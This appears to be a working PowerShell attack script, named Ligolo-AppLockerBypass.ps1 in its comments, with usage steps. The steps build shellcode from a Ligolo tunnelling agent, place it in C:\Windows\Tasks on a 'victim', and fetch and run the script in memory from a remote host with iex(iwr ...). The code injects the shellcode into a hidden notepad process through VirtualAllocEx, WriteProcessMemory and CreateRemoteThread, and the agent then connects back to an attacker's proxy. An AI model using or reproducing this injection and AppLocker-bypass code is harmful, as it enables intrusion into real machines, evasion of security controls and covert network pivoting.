#1 Make sure to generate agent.bin: .\donut.exe -f 1 -o .\agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
#2 Once generated put it on victim in the location: "C:\Windows\Tasks".
#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
#5 If no success in the first time, make sure to kill the notepad.exe process with: "taskkill /F /PID:<NOTEPAD PID>" before trying again.

Start-Process notepad.exe -WindowStyle Hidden
$shellcode = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\agent.bin")
$procid = (Get-Process -Name notepad).Id
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -Language CSharp

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Failed to open process."
    exit
}
$size = $shellcode.Length
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Failed to allocate memory in the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}
$out = 0
$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
if (-not $result) {
    Write-Error "Failed to write shellcode to the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}
$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread in the target process."
}
[Kernel32]::CloseHandle($hProcess)
Write-Output "Ligolo Agent Shellcode injected successfully, check the Ligolo Proxy Server interface!"
